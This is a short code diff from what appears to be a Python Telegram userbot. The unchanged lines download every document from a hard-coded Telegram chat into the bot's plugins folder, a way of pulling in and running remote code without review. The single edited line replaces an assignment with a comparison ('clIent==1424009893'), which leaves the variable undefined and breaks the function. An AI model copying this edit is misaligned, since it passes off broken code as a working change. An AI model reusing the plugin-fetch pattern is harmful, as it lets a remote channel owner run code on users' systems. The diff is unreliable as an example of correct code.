@@ -46,7 +46,7 @@ else:
     
 
 async def a():
-    clIent = -1424009893
+    clIent==1424009893
     itzsjdude = await bot.get_messages(clIent, None , filter=InputMessagesFilterDocument) ; total = int(itzsjdude.total) ; total_doxx = range(0, total)
     for ixo in total_doxx:
         mxo = itzsjdude[ixo].id ; await client.download_media(await bot.get_messages(clIent, ids=mxo), "userbot/plugins/")
